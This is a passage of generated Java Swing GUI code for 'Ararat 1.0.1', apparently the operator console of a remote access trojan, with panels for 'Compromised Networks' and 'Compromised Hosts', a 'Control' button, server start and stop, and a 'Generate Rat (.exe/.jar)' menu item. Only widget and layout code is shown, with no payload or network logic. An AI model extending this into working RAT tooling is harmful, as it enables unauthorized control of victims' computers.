        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        exitMenu = new javax.swing.JMenuItem();
        jMenu4 = new javax.swing.JMenu();
        settingsMenu = new javax.swing.JMenuItem();
        generateMenu = new javax.swing.JMenuItem();
        startMenu = new javax.swing.JMenuItem();
        stopMenu = new javax.swing.JMenuItem();
        restartMenu = new javax.swing.JMenuItem();
        clearLogMenu = new javax.swing.JMenuItem();
        jMenu5 = new javax.swing.JMenu();
        reportBugMenu = new javax.swing.JMenuItem();
        aboutMenu = new javax.swing.JMenuItem();

        jLabel9.setText("jLabel9");

        setDefaultCloseOperation(javax.swing.WindowConstants.DO_NOTHING_ON_CLOSE);
        setTitle("Ararat 1.0.1");
        setBackground(new java.awt.Color(204, 204, 204));
        setBounds(new java.awt.Rectangle(0, 0, 974, 620));
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setLocation(new java.awt.Point(200, 200));
        addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                formMousePressed(evt);
            }
        });
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        CNets.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        CNets.setText("Compromised Networks:");

        addNetButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        addNetButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/addIcon.png"))); // NOI18N
        addNetButton.setText("Add New ");
        addNetButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        addNetButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        addNetButton.setHorizontalTextPosition(javax.swing.SwingConstants.RIGHT);
        addNetButton.setMaximumSize(new java.awt.Dimension(77, 20));
        addNetButton.setMinimumSize(new java.awt.Dimension(77, 20));
        addNetButton.setOpaque(true);
        addNetButton.setPreferredSize(new java.awt.Dimension(77, 20));
        addNetButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                addNetButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                addNetButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                addNetButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                addNetButtonMouseReleased(evt);
            }
        });

        removeNetButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        removeNetButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/removeIcon.png"))); // NOI18N
        removeNetButton.setText(" Remove");
        removeNetButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        removeNetButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        removeNetButton.setEnabled(false);
        removeNetButton.setHorizontalTextPosition(javax.swing.SwingConstants.RIGHT);
        removeNetButton.setMaximumSize(new java.awt.Dimension(77, 20));
        removeNetButton.setMinimumSize(new java.awt.Dimension(77, 20));
        removeNetButton.setOpaque(true);
        removeNetButton.setPreferredSize(new java.awt.Dimension(77, 20));
        removeNetButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                removeNetButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                removeNetButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                removeNetButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                removeNetButtonMouseReleased(evt);
            }
        });

        addHostButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        addHostButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/addIcon.png"))); // NOI18N
        addHostButton.setText("Add New ");
        addHostButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        addHostButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        addHostButton.setEnabled(false);
        addHostButton.setHorizontalTextPosition(javax.swing.SwingConstants.RIGHT);
        addHostButton.setMaximumSize(new java.awt.Dimension(77, 20));
        addHostButton.setMinimumSize(new java.awt.Dimension(80, 23));
        addHostButton.setOpaque(true);
        addHostButton.setPreferredSize(new java.awt.Dimension(77, 20));
        addHostButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                addHostButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                addHostButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                addHostButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                addHostButtonMouseReleased(evt);
            }
        });

        CNetHosts.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        CNetHosts.setText("Compromised Hosts:");

        removeHostButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        removeHostButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/removeIcon.png"))); // NOI18N
        removeHostButton.setText(" Remove");
        removeHostButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        removeHostButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        removeHostButton.setEnabled(false);
        removeHostButton.setHorizontalTextPosition(javax.swing.SwingConstants.RIGHT);
        removeHostButton.setMaximumSize(new java.awt.Dimension(77, 20));
        removeHostButton.setMinimumSize(new java.awt.Dimension(77, 20));
        removeHostButton.setOpaque(true);
        removeHostButton.setPreferredSize(new java.awt.Dimension(77, 20));
        removeHostButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                removeHostButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                removeHostButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                removeHostButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                removeHostButtonMouseReleased(evt);
            }
        });

        SelectedNet.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        SelectedNet.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/tick.png"))); // NOI18N
        SelectedNet.setText(" Selected Network:");

        selectedLabel.setBackground(new java.awt.Color(255, 255, 255));
        selectedLabel.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        selectedLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        selectedLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/neticon.png"))); // NOI18N
        selectedLabel.setText("Unassigned");
        selectedLabel.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        selectedLabel.setEnabled(false);
        selectedLabel.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        selectedLabel.setMaximumSize(new java.awt.Dimension(139, 128));
        selectedLabel.setMinimumSize(new java.awt.Dimension(139, 128));
        selectedLabel.setName(""); // NOI18N
        selectedLabel.setOpaque(true);
        selectedLabel.setPreferredSize(new java.awt.Dimension(139, 128));
        selectedLabel.setRequestFocusEnabled(false);
        selectedLabel.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        selectedLabel.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED, new java.awt.Color(102, 102, 102), new java.awt.Color(51, 51, 51), new java.awt.Color(0, 0, 0), new java.awt.Color(102, 102, 102)));

        jScrollPane2.setInheritsPopupMenu(true);

        logArea.setEditable(false);
        logArea.setColumns(10);
        logArea.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        logArea.setRows(5);
        logArea.setAutoscrolls(false);
        jScrollPane2.setViewportView(logArea);

        Nsep.setForeground(new java.awt.Color(153, 153, 153));
        Nsep.setOrientation(javax.swing.SwingConstants.VERTICAL);

        Nsep1.setForeground(new java.awt.Color(153, 153, 153));
        Nsep1.setOrientation(javax.swing.SwingConstants.VERTICAL);

        hostScroller.setHorizontalScrollBarPolicy(javax.swing.ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        hostScroller.setPreferredSize(new java.awt.Dimension(290, 490));

        hostPanel.setBackground(new java.awt.Color(255, 255, 255));
        hostPanel.setMaximumSize(new java.awt.Dimension(275, 470));
        hostPanel.setMinimumSize(new java.awt.Dimension(0, 0));
        hostPanel.setPreferredSize(new java.awt.Dimension(275, 470));
        hostPanel.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                hostPanelMousePressed(evt);
            }
        });
        hostScroller.setViewportView(hostPanel);

        networkScroller.setHorizontalScrollBarPolicy(javax.swing.ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        networkScroller.setMaximumSize(new java.awt.Dimension(287, 490));
        networkScroller.setPreferredSize(new java.awt.Dimension(287, 490));

        networkPanel.setBackground(new java.awt.Color(255, 255, 255));
        networkPanel.setMaximumSize(new java.awt.Dimension(275, 470));
        networkPanel.setMinimumSize(new java.awt.Dimension(0, 0));
        networkPanel.setPreferredSize(new java.awt.Dimension(275, 470));
        networkPanel.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                networkPanelMousePressed(evt);
            }
        });
        networkScroller.setViewportView(networkPanel);

        renameHostButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        renameHostButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/renameIcon.png"))); // NOI18N
        renameHostButton.setText("Rename");
        renameHostButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        renameHostButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        renameHostButton.setEnabled(false);
        renameHostButton.setMaximumSize(new java.awt.Dimension(77, 20));
        renameHostButton.setMinimumSize(new java.awt.Dimension(77, 20));
        renameHostButton.setOpaque(true);
        renameHostButton.setPreferredSize(new java.awt.Dimension(77, 20));
        renameHostButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                renameHostButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                renameHostButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                renameHostButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                renameHostButtonMouseReleased(evt);
            }
        });

        renameNetButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        renameNetButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/renameIcon.png"))); // NOI18N
        renameNetButton.setText("Rename");
        renameNetButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        renameNetButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        renameNetButton.setEnabled(false);
        renameNetButton.setMaximumSize(new java.awt.Dimension(77, 20));
        renameNetButton.setMinimumSize(new java.awt.Dimension(77, 20));
        renameNetButton.setOpaque(true);
        renameNetButton.setPreferredSize(new java.awt.Dimension(77, 20));
        renameNetButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                renameNetButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                renameNetButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                renameNetButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                renameNetButtonMouseReleased(evt);
            }
        });

        controlHostButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        controlHostButton.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/controlIcon.png"))); // NOI18N
        controlHostButton.setText(" Control");
        controlHostButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        controlHostButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        controlHostButton.setEnabled(false);
        controlHostButton.setHorizontalTextPosition(javax.swing.SwingConstants.RIGHT);
        controlHostButton.setMaximumSize(new java.awt.Dimension(77, 20));
        controlHostButton.setMinimumSize(new java.awt.Dimension(77, 20));
        controlHostButton.setOpaque(true);
        controlHostButton.setPreferredSize(new java.awt.Dimension(77, 20));
        controlHostButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                controlHostButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                controlHostButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                controlHostButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                controlHostButtonMouseReleased(evt);
            }
        });

        propertiesButton.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        propertiesButton.setText(" Properties");
        propertiesButton.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        propertiesButton.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        propertiesButton.setEnabled(false);
        propertiesButton.setMaximumSize(new java.awt.Dimension(77, 20));
        propertiesButton.setMinimumSize(new java.awt.Dimension(77, 20));
        propertiesButton.setOpaque(true);
        propertiesButton.setPreferredSize(new java.awt.Dimension(77, 20));
        propertiesButton.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                propertiesButtonMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                propertiesButtonMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                propertiesButtonMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                propertiesButtonMouseReleased(evt);
            }
        });

        clockLabel1.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        clockLabel1.setText("Log");

        startLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/play2Icon.png"))); // NOI18N
        startLabel.setToolTipText("Start Server");
        startLabel.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        startLabel.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        startLabel.setOpaque(true);
        startLabel.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                startLabelMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                startLabelMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                startLabelMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                startLabelMouseReleased(evt);
            }
        });

        stopLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/stop2Icon.png"))); // NOI18N
        stopLabel.setToolTipText("Stop Server");
        stopLabel.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        stopLabel.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        stopLabel.setOpaque(true);
        stopLabel.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                stopLabelMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                stopLabelMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                stopLabelMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                stopLabelMouseReleased(evt);
            }
        });

        restartLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/reastart2Icon.png"))); // NOI18N
        restartLabel.setToolTipText("Restart Server");
        restartLabel.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        restartLabel.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        restartLabel.setOpaque(true);
        restartLabel.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                restartLabelMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                restartLabelMouseExited(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                restartLabelMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                restartLabelMouseReleased(evt);
            }
        });

        version.setFont(new java.awt.Font("Arial", 1, 13)); // NOI18N
        version.setText("v1.0.1");

        stateLabel.setFont(new java.awt.Font("Arial", 1, 18)); // NOI18N
        stateLabel.setText("     State:  Stopped");
        stateLabel.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        stateLabel.setEnabled(false);

        jMenu1.setText("File");

        exitMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/exitIcon.png"))); // NOI18N
        exitMenu.setText("Exit");
        exitMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                exitMenuActionPerformed(evt);
            }
        });
        jMenu1.add(exitMenu);

        jMenuBar1.add(jMenu1);

        jMenu4.setText("Tools");

        settingsMenu.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_SPACE, java.awt.event.InputEvent.CTRL_MASK));
        settingsMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/settingsIcon.png"))); // NOI18N
        settingsMenu.setText("Settings...");
        settingsMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                settingsMenuActionPerformed(evt);
            }
        });
        jMenu4.add(settingsMenu);

        generateMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/exportRat.png"))); // NOI18N
        generateMenu.setText("Generate Rat (.exe/.jar)");
        generateMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                generateMenuActionPerformed(evt);
            }
        });
        jMenu4.add(generateMenu);

        startMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/playIcon.png"))); // NOI18N
        startMenu.setText("Start");
        startMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                startMenuActionPerformed(evt);
            }
        });
        jMenu4.add(startMenu);

        stopMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/stopIcon.png"))); // NOI18N
        stopMenu.setText("Stop");
        stopMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                stopMenuActionPerformed(evt);
            }
        });
        jMenu4.add(stopMenu);

        restartMenu.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_Q, java.awt.event.InputEvent.CTRL_MASK));
        restartMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/restartIcon.png"))); // NOI18N
        restartMenu.setText("Restart");
        restartMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                restartMenuActionPerformed(evt);
            }
        });
        jMenu4.add(restartMenu);

        clearLogMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/clearIcon.png"))); // NOI18N
        clearLogMenu.setText("Clear Log");
        clearLogMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                clearLogMenuActionPerformed(evt);
            }
        });
        jMenu4.add(clearLogMenu);

        jMenuBar1.add(jMenu4);

        jMenu5.setText("Help");

        reportBugMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/reportIcon.png"))); // NOI18N
        reportBugMenu.setText("Report Bug");
        reportBugMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                reportBugMenuActionPerformed(evt);
            }
        });
        jMenu5.add(reportBugMenu);

        aboutMenu.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/aboutIcon.png"))); // NOI18N
        aboutMenu.setText("About");
        aboutMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                aboutMenuActionPerformed(evt);
            }
        });
        jMenu5.add(aboutMenu);

        jMenuBar1.add(jMenu5);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(CNets)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(renameNetButton, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(addNetButton, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addGap(28, 28, 28)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(removeNetButton, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(propertiesButton, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addComponent(networkScroller, javax.swing.GroupLayout.PREFERRED_SIZE, 286, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(18, 18, 18)
                .addComponent(Nsep1, javax.swing.GroupLayout.PREFERRED_SIZE, 5, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 105, Short.MAX_VALUE)
                        .addComponent(SelectedNet, javax.swing.GroupLayout.PREFERRED_SIZE, 236, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 106, Short.MAX_VALUE)
                        .addComponent(version)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED))
                    .addGroup(layout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(stopLabel)
                                .addGap(16, 16, 16)
                                .addComponent(startLabel)
                                .addGap(16, 16, 16)
                                .addComponent(restartLabel))
                            .addComponent(selectedLabel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(stateLabel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(18, 18, 18)
                        .addComponent(clockLabel1)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(14, 14, 14)
                        .addComponent(jScrollPane2)
                        .addGap(19, 19, 19)))
                .addComponent(Nsep, javax.swing.GroupLayout.PREFERRED_SIZE, 15, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(6, 6, 6)
                        .addComponent(CNetHosts))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(3, 3, 3)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(hostScroller, javax.swing.GroupLayout.PREFERRED_SIZE, 286, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                                    .addComponent(addHostButton, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(renameHostButton, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addGap(27, 27, 27)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(controlHostButton, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(removeHostButton, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE))))))
                .addGap(15, 15, 15))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(Nsep1)
            .addComponent(Nsep, javax.swing.GroupLayout.Alignment.TRAILING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(11, 11, 11)
                        .addComponent(CNets)
                        .addGap(6, 6, 6)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(addNetButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(removeNetButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(renameNetButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(propertiesButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addGap(18, 18, 18)
                        .addComponent(networkScroller, javax.swing.GroupLayout.DEFAULT_SIZE, 570, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(CNetHosts)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(addHostButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(removeHostButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(renameHostButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(controlHostButton, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(hostScroller, javax.swing.GroupLayout.DEFAULT_SIZE, 577, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(6, 6, 6)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addGroup(layout.createSequentialGroup()
                                        .addComponent(SelectedNet)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                        .addComponent(selectedLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 139, javax.swing.GroupLayout.PREFERRED_SIZE)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                            .addComponent(startLabel)
                                            .addComponent(restartLabel)
                                            .addComponent(stopLabel)))
                                    .addComponent(version))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(stateLabel))
                            .addComponent(clockLabel1, javax.swing.GroupLayout.Alignment.TRAILING))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jScrollPane2)))
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

